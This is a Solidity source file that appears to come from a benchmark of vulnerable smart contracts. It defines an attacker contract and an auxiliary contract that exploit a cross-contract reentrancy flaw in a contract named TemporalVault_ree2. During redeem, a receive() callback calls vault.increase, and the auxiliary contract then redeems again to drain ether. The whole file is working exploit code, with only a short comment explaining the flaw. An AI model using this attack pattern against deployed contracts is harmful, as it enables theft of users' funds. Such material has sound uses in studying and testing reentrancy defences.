// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../cross-contract/access-control/temporal/TemporalVault_ree2.sol";

// Contract TemporalVault_ree2 contains a cross-contract reentrancy vulnerability that can be exploited by an attacker.
// Specifically, the attacker can enter the Vault contract and invoke the `increase` function
// during the execution of the `redeem` function, which pays back funds. This allows the attacker
// to manipulate the contract's state and potentially drain funds.

contract TemporalVault_ree2_Attacker {
    TemporalVault_ree2_Vault public immutable vault;
    TemporalVault_ree2 public immutable c;
    bool flag = true;
    TemporalVault_ree2_AttackerAux public aux;

    constructor(address payable _vault, address payable _c) {
        vault = TemporalVault_ree2_Vault(_vault);
        c = TemporalVault_ree2(_c);
        aux = new TemporalVault_ree2_AttackerAux(payable(address(this)), _c);
    }

    function attack() public payable {
        (bool success, ) = address(c).call{value: 1 ether}("");
        require(success);
        c.redeem(payable(address(this)));
        aux.redeem();
    }

    receive() external payable {
        vault.increase(address(aux), 2 ether);
    }

    function deposit() public payable {}

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract TemporalVault_ree2_AttackerAux {
    TemporalVault_ree2_Attacker att;
    TemporalVault_ree2 c;

    constructor(address payable _att, address payable _c) {
        att = TemporalVault_ree2_Attacker(_att);
        c = TemporalVault_ree2(_c);
    }

    function redeem() external {
        c.redeem(payable(address(this)));
        att.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
